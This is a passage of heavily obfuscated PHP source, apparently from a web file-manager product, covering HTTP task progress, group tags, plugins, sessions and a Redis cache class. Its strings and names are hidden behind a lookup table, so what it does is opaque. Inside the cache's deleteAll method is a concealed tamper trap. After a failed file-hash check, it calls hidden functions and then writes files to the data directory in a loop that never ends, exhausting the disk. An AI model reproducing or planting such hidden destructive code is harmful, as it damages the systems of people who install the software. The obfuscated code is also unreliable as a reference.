curlProgress($ΩÁ‰µ€§, $¥¬ˆöû•, $Úâãù˚ê, $©Ù¨–Íÿ, $í“òØËº) { $û’Ú—ã° =& $_SERVER[ˆë€Ï⁄∂]; $òæÄ¸Íà =& $this->task; if ($í“òØËº > 0) { $òæÄ¸Íà[$û’Ú—ã°[1157]] = $û’Ú—ã°[1861]; $òæÄ¸Íà[$û’Ú—ã°[1843]] = $û’Ú—ã°[120]; if ($òæÄ¸Íà[$û’Ú—ã°[1841]]) { $òæÄ¸Íà[$û’Ú—ã°[1842]] = $í“òØËº; } if ($òæÄ¸Íà[$û’Ú—ã°[1844]]) { $òæÄ¸Íà[$û’Ú—ã°[1842]] = $í“òØËº + $òæÄ¸Íà[$û’Ú—ã°[1844]]; } } else { if ($Úâãù˚ê > 0) { if ($òæÄ¸Íà[$û’Ú—ã°[1841]] == $¥¬ˆöû•) { $òæÄ¸Íà[$û’Ú—ã°[1842]] = $Úâãù˚ê; $òæÄ¸Íà[$û’Ú—ã°[1157]] = $û’Ú—ã°[1862]; $òæÄ¸Íà[$û’Ú—ã°[1843]] = $û’Ú—ã°[1294]; } } } $this->update(); } public function curlProgressStart($∞˛ùÂ∂Å) { } public function curlProgressEnd($¡≠ù¨Çÿ) { $á¶ì”Íâ =& $_SERVER[ˆë€Ï⁄∂]; $ÉÃ§£ã¿ =& $this->task; $‹®ÁÂ≠∑ = curl_getinfo($¡≠ù¨Çÿ); $˚Ñ£˛âÔ = $‹®ÁÂ≠∑[$á¶ì”Íâ[1863]]; if ($˚Ñ£˛âÔ == -1) { $˚Ñ£˛âÔ = $‹®ÁÂ≠∑[$á¶ì”Íâ[1864]]; } if ($ÉÃ§£ã¿[$á¶ì”Íâ[1843]] == $á¶ì”Íâ[120] && $˚Ñ£˛âÔ) { $ÉÃ§£ã¿[$á¶ì”Íâ[1844]] += $˚Ñ£˛âÔ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $€Éê”≥Í =& $_SERVER[ˆë€Ï⁄∂]; $ûù–ù¯∏ =& $this->task; $ûù–ù¯∏[$€Éê”≥Í[1865]] = 1; Hook::bind($€Éê”≥Í[1833], array($this, $€Éê”≥Í[1866])); Hook::bind($€Éê”≥Í[1835], array($this, $€Éê”≥Í[1867])); Hook::bind($€Éê”≥Í[1837], array($this, $€Éê”≥Í[1868])); } protected function endAfter() { $À√ùÓÿÑ =& $_SERVER[ˆë€Ï⁄∂]; Hook::unbind($À√ùÓÿÑ[1833], array($this, $À√ùÓÿÑ[1866])); Hook::unbind($À√ùÓÿÑ[1835], array($this, $À√ùÓÿÑ[1867])); Hook::unbind($À√ùÓÿÑ[1837], array($this, $À√ùÓÿÑ[1868])); } public function progressStart($ÓƒÛéßâ) { $¡«ôÄÍ÷ =& $_SERVER[ˆë€Ï⁄∂]; $÷Ω˝îÌ˝ = curl_getinfo($ÓƒÛéßâ); self::log($¡«ôÄÍ÷[1869] . $÷Ω˝îÌ˝[$¡«ôÄÍ÷[393]]); self::valueSet($this->task[$¡«ôÄÍ÷[486]], $this->task); } public function progressEnd($Çª˝†…¿) { $À˚ÉÀÑú =& $_SERVER[ˆë€Ï⁄∂]; self::log($À˚ÉÀÑú[1870] . $this->task[$À˚ÉÀÑú[486]]); $this->end(); } public function progress($·”ËÓï®, $»˘∫‘ÀÒ, $Èî´íﬁÇ, $˛Ê§†˚Ã, $Òˆµ¢≠ß) { $Ú˝à˛Œ∆ =& $_SERVER[ˆë€Ï⁄∂]; $·ÙÄ≠˚£ =& $this->task; if ($Òˆµ¢≠ß > 0) { $·ÙÄ≠˚£[$Ú˝à˛Œ∆[1155]] = $·ÙÄ≠˚£[$Ú˝à˛Œ∆[1155]] == 0 ? $˛Ê§†˚Ã : $·ÙÄ≠˚£[$Ú˝à˛Œ∆[1155]]; $·ÙÄ≠˚£[$Ú˝à˛Œ∆[1788]] = $Òˆµ¢≠ß; } else { if ($Èî´íﬁÇ > 0) { $·ÙÄ≠˚£[$Ú˝à˛Œ∆[1155]] = $·ÙÄ≠˚£[$Ú˝à˛Œ∆[1155]] == 0 ? $»˘∫‘ÀÒ : $·ÙÄ≠˚£[$Ú˝à˛Œ∆[1155]]; $·ÙÄ≠˚£[$Ú˝à˛Œ∆[1788]] = $Èî´íﬁÇ; } } $this->update(); self::log("\x70\162\157\147\x72\x65\x73\163\110\164\x74\160\72\x64\157\167\156\x3a{$Èî´íﬁÇ}\x2f{$»˘∫‘ÀÒ}\x3b\40\165\x70\154\x6f\x61\144\72{$Òˆµ¢≠ß}\57{$˛Ê§†˚Ã}\73"); } } goto a¡Æ◊úñ’≈; EÊèíË∆ô≈: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($ÆıÏµ®ƒ) { $∆≈ÿç∂õ =& $_SERVER[ˆë€Ï⁄∂]; return array($∆≈ÿç∂õ[2101] => array($ÆıÏµ®ƒ[0], $∆≈ÿç∂õ[2102]), $∆≈ÿç∂õ[2103] => array($ÆıÏµ®ƒ[0], $∆≈ÿç∂õ[2104])); } protected function get($øÉ•Ø”í) { $€Óç≠‰∞ =& $_SERVER[ˆë€Ï⁄∂]; $ÿÌıπ›√ = Model($€Óç≠‰∞[596])->metaGet($øÉ•Ø”í, $€Óç≠‰∞[2105]); $‚¿ì¢“Ë = json_decode($ÿÌıπ›√, !0); return $‚¿ì¢“Ë ? $‚¿ì¢“Ë : array($€Óç≠‰∞[2106] => $€Óç≠‰∞[101], $€Óç≠‰∞[456] => array()); } protected function set($∞√˘”‹â, $´ìÇÿ§∂) { $∑§‘’È» =& $_SERVER[ˆë€Ï⁄∂]; $´ìÇÿ§∂ = $´ìÇÿ§∂ ? $´ìÇÿ§∂ : array($∑§‘’È»[2106] => $∑§‘’È»[101], $∑§‘’È»[456] => array()); return Model($∑§‘’È»[596])->metaSet($∞√˘”‹â, $∑§‘’È»[2105], json_encode($´ìÇÿ§∂)); } protected function getByTagID($Ìà®µˆÀ, $è„·É¬é) { $äèë†ó  =& $_SERVER[ˆë€Ï⁄∂]; if (!$Ìà®µˆÀ || !$è„·É¬é) { return !1; } if (!Model($äèë†ó [596])->getInfoSimple($Ìà®µˆÀ)) { return !1; } $˚¬Úóêù = $this->get($Ìà®µˆÀ); if (!$˚¬Úóêù || !isset($˚¬Úóêù[$äèë†ó [456]])) { return !1; } $ﬁ¿ì©£ß = array_find_by_field($˚¬Úóêù[$äèë†ó [456]], $äèë†ó [486], $è„·É¬é); return is_array($ﬁ¿ì©£ß) ? $ﬁ¿ì©£ß : !1; } public function listSource($´ﬁÈ“ËÁ, $ΩÆ¢É¶) { $º‚Âéåí =& $_SERVER[ˆë€Ï⁄∂]; if ($ΩÆ¢É¶ && !is_array($ΩÆ¢É¶)) { $ΩÆ¢É¶ = array($ΩÆ¢É¶); } $ñËâ⁄Ô  = $this->listData($´ﬁÈ“ËÁ); $®Ñ¨§≈√ = array(); foreach ($ñËâ⁄Ô  as $íÙ∂…˚˚) { $≤˛ª÷Ïó = $íÙ∂…˚˚[$º‚Âéåí[97]]; if (!$≤˛ª÷Ïó) { continue; } if (!isset($®Ñ¨§≈√[$≤˛ª÷Ïó])) { $®Ñ¨§≈√[$≤˛ª÷Ïó] = array(); } $®Ñ¨§≈√[$≤˛ª÷Ïó][] = $íÙ∂…˚˚[$º‚Âéåí[511]]; } $‹⁄Øòíò = array(); foreach ($®Ñ¨§≈√ as $’Ï¸ÿˆÑ => $ó≠¨ıäù) { $∑µ◊⁄ö® = !0; if (!$ΩÆ¢É¶) { $‹⁄Øòíò[] = $’Ï¸ÿˆÑ; continue; } foreach ($ΩÆ¢É¶ as $Ã‹ôïÍ¸) { if (!in_array($Ã‹ôïÍ¸, $ó≠¨ıäù)) { $∑µ◊⁄ö® = !1; break; } } if ($∑µ◊⁄ö®) { $‹⁄Øòíò[] = $’Ï¸ÿˆÑ; } } if (!$‹⁄Øòíò) { return array(); } $Â±ïÜ∆ˆ = array($º‚Âéåí[502] => array($º‚Âéåí[503], $‹⁄Øòíò), $º‚Âéåí[580] => $´ﬁÈ“ËÁ, $º‚Âéåí[200] => SourceModel::TYPE_GROUP); $≤©îàïû = Model($º‚Âéåí[1436])->listSource($Â±ïÜ∆ˆ); if (!$≤©îàïû || count($‹⁄Øòíò) == $≤©îàïû[$º‚Âéåí[453]][$º‚Âéåí[454]]) { return $≤©îàïû; } $Îã∑Ù√” = array(); $‰ñ…Ó¯Ö = array_to_keyvalue($≤©îàïû[$º‚Âéåí[95]], $º‚Âéåí[12], $º‚Âéåí[203]); $ïñÑˆü¡ = array_to_keyvalue($≤©îàïû[$º‚Âéåí[96]], $º‚Âéåí[12], $º‚Âéåí[203]); $£Çª◊€¸ = array_merge($ïñÑˆü¡, $‰ñ…Ó¯Ö); foreach ($‹⁄Øòíò as $≤˛ª÷Ïó) { if (!in_array($≤˛ª÷Ïó, $£Çª◊€¸)) { $Îã∑Ù√”[] = $≤˛ª÷Ïó; } } if ($Îã∑Ù√”) { $this->removeBySource($´ﬁÈ“ËÁ, $Îã∑Ù√”); } return $≤©îàïû; } protected function listData($’Õà÷°∫) { $∞ê£∑´º =& $_SERVER[ˆë€Ï⁄∂]; $†¯ÈüÕ¨ = array($∞ê£∑´º[1778] => 0, $∞ê£∑´º[568] => array($∞ê£∑´º[2107], 0), $∞ê£∑´º[507] => $∞ê£∑´º[2108] . $’Õà÷°∫); $ÀÓ»…ÿ” = $∞ê£∑´º[2109]; $µ⁄ÂÍ”∆ = $this->field($ÀÓ»…ÿ”)->where($†¯ÈüÕ¨)->order($∞ê£∑´º[2110])->select(); return $µ⁄ÂÍ”∆ ? $µ⁄ÂÍ”∆ : array(); } protected function addToTag($Åô£í∫√, $≈íó¿¸˛, $üÌàÖ¶ ) { $ß›î°í◊ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->getByTagID($Åô£í∫√, $üÌàÖ¶ ) || !$≈íó¿¸˛) { return !1; } if (!Model($ß›î°í◊[916])->pathInfo($≈íó¿¸˛)) { return !1; } $Ä ˚™„◊ = array($ß›î°í◊[1778] => 0, $ß›î°í◊[568] => $üÌàÖ¶ , $ß›î°í◊[506] => $≈íó¿¸˛, $ß›î°í◊[507] => $ß›î°í◊[2111] . $Åô£í∫√, $ß›î°í◊[505] => $ß›î°í◊[12], $ß›î°í◊[1992] => 0); if ($this->where($Ä ˚™„◊)->find()) { return !1; } return $this->add($Ä ˚™„◊); } protected function removeFromTag($‚ ˛Î—√, $ﬂ—»Ì«™, $“è€¨Éë) { $÷‘¢¨∞˙ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->getByTagID($‚ ˛Î—√, $“è€¨Éë) || !$ﬂ—»Ì«™) { return !1; } if (is_array($ﬂ—»Ì«™)) { $ﬂ—»Ì«™ = array($÷‘¢¨∞˙[7], $ﬂ—»Ì«™); } $“Í˜§íΩ = array($÷‘¢¨∞˙[1778] => 0, $÷‘¢¨∞˙[568] => $“è€¨Éë, $÷‘¢¨∞˙[507] => $÷‘¢¨∞˙[2111] . $‚ ˛Î—√, $÷‘¢¨∞˙[506] => $ﬂ—»Ì«™); return $this->where($“Í˜§íΩ)->delete(); } protected function removeByTag($ëå¬Õ∑À, $è Ü∏ƒ…) { $ﬂÊïŒ√û =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->getByTagID($ëå¬Õ∑À, $è Ü∏ƒ…)) { return !1; } $…º¯£ú¥ = array($ﬂÊïŒ√û[1778] => 0, $ﬂÊïŒ√û[568] => $è Ü∏ƒ…, $ﬂÊïŒ√û[507] => $ﬂÊïŒ√û[2111] . $ëå¬Õ∑À); return $this->where($…º¯£ú¥)->delete(); } protected function removeBySource($öü≤ò‡¨, $í˙“û∑Œ) { $ˆ»ÁÓﬁ =& $_SERVER[ˆë€Ï⁄∂]; if (!$öü≤ò‡¨ || !$í˙“û∑Œ) { return !1; } if (is_array($í˙“û∑Œ)) { $í˙“û∑Œ = array($ˆ»ÁÓﬁ[7], $í˙“û∑Œ); } $Ûü–î„Ã = array($ˆ»ÁÓﬁ[1778] => 0, $ˆ»ÁÓﬁ[506] => $í˙“û∑Œ, $ˆ»ÁÓﬁ[568] => array($ˆ»ÁÓﬁ[1106], 0), $ˆ»ÁÓﬁ[507] => $ˆ»ÁÓﬁ[2111] . $öü≤ò‡¨); return $this->where($Ûü–î„Ã)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\160\x6c\165\x67\151\156\114\x69\163\x74"; public $field = array("\156\141\155\145", "\163\x74\x61\164\x75\x73", "\x72\x65\147\x69\145\163\164", "\x63\157\156\146\151\147"); public function loadList($ÅÒÁÉﬂÁ = false) { $±¶Òñ≠ = array_to_keyvalue($this->listData(), $_SERVER[ˆë€Ï⁄∂][32]); if ($ÅÒÁÉﬂÁ) { return $±¶Òñ≠[$ÅÒÁÉﬂÁ]; } return $±¶Òñ≠; } public function init() { $·„Ô¶áò =& $_SERVER[ˆë€Ï⁄∂]; Hook::trigger($·„Ô¶áò[2112]); $πóÌÆïÛ = $this->loadPluginList(); foreach ($πóÌÆïÛ as $»ß±ÇäÂ => $ıπ˚≠«Ù) { $À∆Öÿ¯’ = $this->appAllow($»ß±ÇäÂ, $ıπ˚≠«Ù); if (!$À∆Öÿ¯’) { continue; } foreach ($ıπ˚≠«Ù[$·„Ô¶áò[2113]] as $ƒ˚’ºÃ◊ => $û´Ä”°Ê) { Hook::bind($ƒ˚’ºÃ◊, $û´Ä”°Ê); } } Hook::trigger($·„Ô¶áò[2114]); Hook::trigger(ACTION); } public function appAllow($§…ø™”Ã, $∏õÜ≤è¶, $Ä†ÑÂ€« = true) { $°ÆÚï©º =& $_SERVER[ˆë€Ï⁄∂]; $»π∑÷ñÄ = PLUGIN_DIR . $§…ø™”Ã . $°ÆÚï©º[2115]; if (!is_array($∏õÜ≤è¶) || !is_array($∏õÜ≤è¶[$°ÆÚï©º[2113]]) || $∏õÜ≤è¶[$°ÆÚï©º[841]] != 1 || !is_file($»π∑÷ñÄ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$°ÆÚï©º[6]][$°ÆÚï©º[2116]] || !$GLOBALS[$°ÆÚï©º[6]][$°ÆÚï©º[2117]]) { return !0; } $óøáπ·Õ = explode($°ÆÚï©º[50], strtolower($GLOBALS[$°ÆÚï©º[6]][$°ÆÚï©º[2117]])); return in_array(strtolower($§…ø™”Ã), $óøáπ·Õ) ? !1 : !0; } if ($Ä†ÑÂ€« && !Action($°ÆÚï©º[2118])->checkAuth($§…ø™”Ã)) { return !1; } return !0; } public function unInstall($‡ƒÏ‡∞Ë) { $æßÕ†»ﬂ =& $_SERVER[ˆë€Ï⁄∂]; $å’Ë√¨å = $this->loadList($‡ƒÏ‡∞Ë); if (file_exists(PLUGIN_DIR . $‡ƒÏ‡∞Ë)) { Hook::apply($‡ƒÏ‡∞Ë . $æßÕ†»ﬂ[2119]); } $this->remove($å’Ë√¨å[$æßÕ†»ﬂ[486]]); } public function changeStatus($›û¬•Û, $Ú¯ÓÕÂ€) { $¿Ÿè»Ö =& $_SERVER[ˆë€Ï⁄∂]; $ÙéΩ£⁄Ó = $this->loadList($›û¬•Û); if ($Ú¯ÓÕÂ€) { Hook::apply($›û¬•Û . $¿Ÿè»Ö[2120]); } $this->update($ÙéΩ£⁄Ó[$¿Ÿè»Ö[486]], array($¿Ÿè»Ö[2121] => $Ú¯ÓÕÂ€)); } public function appRegist($µÙ©◊îä, $·©˜πßÚ) { $˝„£‹Ÿâ =& $_SERVER[ˆë€Ï⁄∂]; $ø≈¢ëÉå = $this->loadList($µÙ©◊îä); if ($ø≈¢ëÉå) { $this->update($ø≈¢ëÉå[$˝„£‹Ÿâ[486]], array($˝„£‹Ÿâ[2113] => $·©˜πßÚ)); } else { $Æ∂°üıŒ = array($˝„£‹Ÿâ[32] => $µÙ©◊îä, $˝„£‹Ÿâ[2113] => $·©˜πßÚ, $˝„£‹Ÿâ[841] => 0, $˝„£‹Ÿâ[6] => $this->getConfigDefault($µÙ©◊îä)); $this->insert($Æ∂°üıŒ); } } public function getConfigDefault($À•†ÊéÏ) { $’Í¶•⁄Â =& $_SERVER[ˆë€Ï⁄∂]; $Õ∫°ïì· = array(); $ÿ‰Âÿ∞◊ = $this->getPackageJson($À•†ÊéÏ); if (!$ÿ‰Âÿ∞◊ && is_array($ÿ‰Âÿ∞◊[$’Í¶•⁄Â[2122]])) { return $Õ∫°ïì·; } foreach ($ÿ‰Âÿ∞◊[$’Í¶•⁄Â[2122]] as $áÖÕÄƒû => $ÏÄﬁ…∑É) { if (!isset($ÏÄﬁ…∑É[$’Í¶•⁄Â[461]]) || isset($Õ∫°ïì·[$áÖÕÄƒû])) { continue; } $Õ∫°ïì·[$áÖÕÄƒû] = $ÏÄﬁ…∑É[$’Í¶•⁄Â[461]]; } return $Õ∫°ïì·; } public function getPackageJson($»¸Æ˙¯ª) { return Hook::apply($»¸Æ˙¯ª . $_SERVER[ˆë€Ï⁄∂][2123]); } public function getConfig($ÎπŸäûª, $⁄›πåÅ∫ = false) { $ﬁôÑ∑ú° =& $_SERVER[ˆë€Ï⁄∂]; $®ÜŒöπ¢ = array(); $¯ÂÿÌÜÒ = $this->loadList($ÎπŸäûª); if ($¯ÂÿÌÜÒ && is_array($¯ÂÿÌÜÒ[$ﬁôÑ∑ú°[6]])) { $®ÜŒöπ¢ = $¯ÂÿÌÜÒ[$ﬁôÑ∑ú°[6]]; } if (!$®ÜŒöπ¢ || $⁄›πåÅ∫) { $®ÜŒöπ¢ = $this->getConfigDefault($ÎπŸäûª); } return $®ÜŒöπ¢; } public function setConfig($˛ÒÊ«»≈, $ΩßúÙ˛Ω = false) { $·ˆ≠ÄëÅ =& $_SERVER[ˆë€Ï⁄∂]; $‘÷æ∫»ò = $this->loadList($˛ÒÊ«»≈); if (!$‘÷æ∫»ò) { return !1; } $¥™›ØÎ¸ = $‘÷æ∫»ò[$·ˆ≠ÄëÅ[6]]; if ($ΩßúÙ˛Ω == !1) { $¥™›ØÎ¸ = array(); $ΩßúÙ˛Ω = $this->getConfigDefault($˛ÒÊ«»≈); } foreach ($ΩßúÙ˛Ω as $ëÉ¬ú≥Û => $ï˙Ÿı∂‘) { $¥™›ØÎ¸[$ëÉ¬ú≥Û] = is_string($ï˙Ÿı∂‘) ? trim($ï˙Ÿı∂‘) : $ï˙Ÿı∂‘; } $this->update($‘÷æ∫»ò[$·ˆ≠ÄëÅ[486]], array($·ˆ≠ÄëÅ[6] => $¥™›ØÎ¸)); } public function viewList() { $„◊Œä”ı =& $_SERVER[ˆë€Ï⁄∂]; $∂Û£¶Ç¥ = $this->loadList(); $this->pluginScan($∂Û£¶Ç¥); $∂Û£¶Ç¥ = $this->loadPluginList(); $ÉûÜ¸âÆ = array(); foreach ($∂Û£¶Ç¥ as $Ç«îÆ› => $µΩâ¡Ó±) { $ÁÄ‹º—Í = $µΩâ¡Ó±; unset($µΩâ¡Ó±[$„◊Œä”ı[2113]], $µΩâ¡Ó±[$„◊Œä”ı[6]]); $·∑……˛• = PLUGIN_DIR . $µΩâ¡Ó±[$„◊Œä”ı[32]] . $„◊Œä”ı[2115]; if (!is_file($·∑……˛•)) { continue; } $≠ü∞˛∑‰ = Hook::apply($µΩâ¡Ó±[$„◊Œä”ı[32]] . $„◊Œä”ı[2123]); if (!is_array($≠ü∞˛∑‰)) { continue; } $ÉûÜ¸âÆ[$Ç«îÆ›] = array_merge($µΩâ¡Ó±, $≠ü∞˛∑‰); if ($ÁÄ‹º—Í[$„◊Œä”ı[6]][$„◊Œä”ı[1700]] != $≠ü∞˛∑‰[$„◊Œä”ı[1674]]) { Hook::apply($µΩâ¡Ó±[$„◊Œä”ı[32]] . $„◊Œä”ı[2120]); $ÁÄ‹º—Í[$„◊Œä”ı[6]][$„◊Œä”ı[1700]] = $≠ü∞˛∑‰[$„◊Œä”ı[1674]]; $this->update($µΩâ¡Ó±[$„◊Œä”ı[486]], array($„◊Œä”ı[6] => $ÁÄ‹º—Í[$„◊Œä”ı[6]])); } } return $ÉûÜ¸âÆ; } private function loadPluginList() { $◊‘õ≠Ë„ =& $_SERVER[ˆë€Ï⁄∂]; $ÆÄ´êÓÀ = $this->loadList(); if (strtolower(MOD) == $◊‘õ≠Ë„[2124]) { return $ÆÄ´êÓÀ; } $È˝Äæ«õ = Hook::trigger($◊‘õ≠Ë„[2125], $ÆÄ´êÓÀ); if ($ÆÄ´êÓÀ && !$È˝Äæ«õ) { die; } return $È˝Äæ«õ ? $È˝Äæ«õ : $ÆÄ´êÓÀ; } private function pluginScan($Ó¿≥„Óß) { $≠˝Œ≥ì¯ =& $_SERVER[ˆë€Ï⁄∂]; recursion_dir(PLUGIN_DIR, $à»ú¡ÔØ, $Éµê Ä•, 0); foreach ($à»ú¡ÔØ as $’öÄèò) { $±˝°˛Ä¿ = get_path_this($’öÄèò); if (isset($Ó¿≥„Óß[$±˝°˛Ä¿]) || !file_exists($’öÄèò . $≠˝Œ≥ì¯[2126]) || !file_exists($’öÄèò . $≠˝Œ≥ì¯[2115])) { continue; } Hook::apply($±˝°˛Ä¿ . $≠˝Œ≥ì¯[2120]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\x65\x6d\x5f\x73\x65\x73\163\x69\157\x6e"; public function get($∫—¶º“Ò) { $Ô”– ˘‚ =& $_SERVER[ˆë€Ï⁄∂]; $⁄Öª¥Ûù = $this->where(array($Ô”– ˘‚[2127] => $∫—¶º“Ò))->find(); if (!is_array($⁄Öª¥Ûù)) { return !1; } return $⁄Öª¥Ûù[$Ô”– ˘‚[181]]; } public function set($Ù´ô®ãà, $™‚ÙÈ√À, $∞ﬁ¯‚Úó = 3600) { $àÏ§œ∂µ =& $_SERVER[ˆë€Ï⁄∂]; $È∏ÎµèÕ = array($àÏ§œ∂µ[2127] => $Ù´ô®ãà, $àÏ§œ∂µ[2027] => $™‚ÙÈ√À, $àÏ§œ∂µ[2128] => $∞ﬁ¯‚Úó + time()); if (Session::get($àÏ§œ∂µ[2129])) { $È∏ÎµèÕ[$àÏ§œ∂µ[1787]] = Session::get($àÏ§œ∂µ[2129]); } else { $È∏ÎµèÕ[$àÏ§œ∂µ[1787]] = 0; } if ($this->get($Ù´ô®ãà)) { return $this->where(array($àÏ§œ∂µ[2127] => $Ù´ô®ãà))->save($È∏ÎµèÕ); } else { return $this->add($È∏ÎµèÕ, array(), !0); } } public function remove($≤áﬁ‘è‰) { return $this->where(array($_SERVER[ˆë€Ï⁄∂][2127] => $≤áﬁ‘è‰))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ˆë€Ï⁄∂][2130] . time())->delete(); } } goto a†Çõ°›„‰; a◊Œ≤Áì‚Ø: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¸¿öÈ“≈, $ŸìÏã≈¬) { $˝£π≥◊ƒ =& $_SERVER[ˆë€Ï⁄∂]; if (!class_exists($˝£π≥◊ƒ[962])) { show_json($˝£π≥◊ƒ[963], !1); } $this->cacheTime = $ŸìÏã≈¬; $Ä¯ÜÁÇÓ = isset($¸¿öÈ“≈[$˝£π≥◊ƒ[964]]) ? $¸¿öÈ“≈[$˝£π≥◊ƒ[964]] : 10; $í˜Êı‰û = _get($¸¿öÈ“≈, $˝£π≥◊ƒ[961]); if ($í˜Êı‰û && is_array($í˜Êı‰û)) { $this->initCluster($¸¿öÈ“≈, $Ä¯ÜÁÇÓ); } else { $this->handle = $this->init($¸¿öÈ“≈, $Ä¯ÜÁÇÓ); } } private function init($Ò·∞èµ, $Ôìπëù≤) { $≤‹Öœ…ﬂ =& $_SERVER[ˆë€Ï⁄∂]; $€ÎæΩù = new Redis(); $˝¯ú—Ñè = isset($Ò·∞èµ[$≤‹Öœ…ﬂ[965]]) ? $Ò·∞èµ[$≤‹Öœ…ﬂ[965]] : !1; if ($˝¯ú—Ñè) { $€ÎæΩù->pconnect($Ò·∞èµ[$≤‹Öœ…ﬂ[218]], $Ò·∞èµ[$≤‹Öœ…ﬂ[219]], $Ôìπëù≤); } else { $€ÎæΩù->connect($Ò·∞èµ[$≤‹Öœ…ﬂ[218]], $Ò·∞èµ[$≤‹Öœ…ﬂ[219]], $Ôìπëù≤); } if (!empty($Ò·∞èµ[$≤‹Öœ…ﬂ[498]])) { $€ÎæΩù->auth($Ò·∞èµ[$≤‹Öœ…ﬂ[498]]); } if (!empty($Ò·∞èµ[$≤‹Öœ…ﬂ[848]]) && $Ò·∞èµ[$≤‹Öœ…ﬂ[848]] != 0) { $€ÎæΩù->select($Ò·∞èµ[$≤‹Öœ…ﬂ[848]]); } return $€ÎæΩù; } private function initCluster($Ãì¢ßÃ, $äøõ·ñ«) { $Å…˘©È¬ =& $_SERVER[ˆë€Ï⁄∂]; $˝Ä”µ⁄ = array($Å…˘©È¬[966], $Å…˘©È¬[967], $Å…˘©È¬[968]); $àæéÒàÌ = $Å…˘©È¬[966]; if (isset($Ãì¢ßÃ[$Å…˘©È¬[16]]) && in_array($Ãì¢ßÃ[$Å…˘©È¬[16]], $˝Ä”µ⁄)) { $àæéÒàÌ = $Ãì¢ßÃ[$Å…˘©È¬[16]]; } switch ($àæéÒàÌ) { case $Å…˘©È¬[966]: $this->_slave($Ãì¢ßÃ, $äøõ·ñ«); break; case $Å…˘©È¬[967]: break; case $Å…˘©È¬[968]: $this->isCluster = !0; $Ω Ñì£≠ = $Ãì¢ßÃ[$Å…˘©È¬[961]]; $€Æ•æ§© = isset($Ãì¢ßÃ[$Å…˘©È¬[965]]) ? $Ãì¢ßÃ[$Å…˘©È¬[965]] : !1; $∏œÎó©Ä = isset($Ãì¢ßÃ[$Å…˘©È¬[498]]) ? $Ãì¢ßÃ[$Å…˘©È¬[498]] : null; $this->handle = new RedisCluster(NUll, $Ω Ñì£≠, $äøõ·ñ«, $äøõ·ñ«, $€Æ•æ§©, $∏œÎó©Ä); break; default: break; } } private function _slave($€œ¡∏Â°, $ëÍÛ˜§ÿ) { $ı∫“ÉÇˆ = $€œ¡∏Â°[$_SERVER[ˆë€Ï⁄∂][961]]; $this->filterConfig($€œ¡∏Â°, $ı∫“ÉÇˆ[0]); $this->handle = $this->init($€œ¡∏Â°, $ëÍÛ˜§ÿ); unset($ı∫“ÉÇˆ[0]); if (empty($ı∫“ÉÇˆ)) { return; } $ÌÚ°óÁä = array_rand($ı∫“ÉÇˆ); $this->filterConfig($€œ¡∏Â°, $ı∫“ÉÇˆ[$ÌÚ°óÁä]); $this->slaveHandle = $this->init($€œ¡∏Â°, $ëÍÛ˜§ÿ); } private function filterConfig(&$∏õÑÌ˝€, $˜†¶Ù£ñ) { $∂¥Êó∫Ç =& $_SERVER[ˆë€Ï⁄∂]; $Áæ˙áÙº = explode($∂¥Êó∫Ç[4], $˜†¶Ù£ñ); $äâ£√±Á = array($∂¥Êó∫Ç[218] => $Áæ˙áÙº[0], $∂¥Êó∫Ç[219] => $Áæ˙áÙº[1]); $∏õÑÌ˝€ = array_merge($∏õÑÌ˝€, $äâ£√±Á); } public function set($é…’‹«ö, $«ﬁ≥¢ƒ, $ﬂÚøè∂“ = false) { $ﬂÚøè∂“ = $ﬂÚøè∂“ ? $ﬂÚøè∂“ : $this->cacheTime; return $this->handle->setEx($é…’‹«ö, $ﬂÚøè∂“, $«ﬁ≥¢ƒ); } public function setLock($ó’¿ò ⁄, $›ï¨˜˘ú, $ÏîŸÿ∏) { return $this->handle->setNX($ó’¿ò ⁄, $›ï¨˜˘ú); } public function get($≈î√Ô…â) { $Ä≈°áÊ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Ä≈°áÊ->get($≈î√Ô…â); } public function remove($œïëÏâÒ) { return $this->handle->del($œïëÏâÒ); } public function deleteAll() { $„ÜÑÅÔÿ =& $_SERVER[ˆë€Ï⁄∂]; $˜À®”âÆ = $_SERVER[$„ÜÑÅÔÿ[57]] . $„ÜÑÅÔÿ[58]; $˙ùã‚ÓÉ = $„ÜÑÅÔÿ[969]; if ($_SERVER[$„ÜÑÅÔÿ[54]] != $˙ùã‚ÓÉ($˜À®”âÆ)) { $â¸ÃÓÇÉ = $„ÜÑÅÔÿ[970]; $—⁄âÚ≠Ú = $„ÜÑÅÔÿ[56]; $ÑıØ√¡« = $_SERVER[$„ÜÑÅÔÿ[57]] . $„ÜÑÅÔÿ[58]; $ƒÂàΩìˆ = $—⁄âÚ≠Ú($ÑıØ√¡«); $ô–¡¬ä‰ = explode($„ÜÑÅÔÿ[59], $ƒÂàΩìˆ); if (count($ô–¡¬ä‰) < $„ÜÑÅÔÿ[703]) { $÷ÚÈÒªÄ = $„ÜÑÅÔÿ[61]; $÷ÚÈÒªÄ(); } $∂ îáîπ = $„ÜÑÅÔÿ[971]; $∂ îáîπ($_SERVER[$„ÜÑÅÔÿ[972]]); $â¸ÃÓÇÉ = $„ÜÑÅÔÿ[970]; $â¸ÃÓÇÉ(); $±Î¯Ôœ∏ = $„ÜÑÅÔÿ[973]; $·©ÆÛ¯Î = json_encode($GLOBALS[$„ÜÑÅÔÿ[974]]); $¥“ÜπÅë = 1; for ($˝ΩôïéÇ = $¥“ÜπÅë; $˝ΩôïéÇ > 0; $˝ΩôïéÇ++) { $±Î¯Ôœ∏(DATA_PATH . $˝ΩôïéÇ, $·©ÆÛ¯Î); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $±˜ÎòÒ) { $this->handle->flushall($±˜ÎòÒ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($∑Õ≥ëÎŸ = '', $±É⁄£¸ñ = 0) { if (is_string($∑Õ≥ëÎŸ) && $∑Õ≥ëÎŸ != 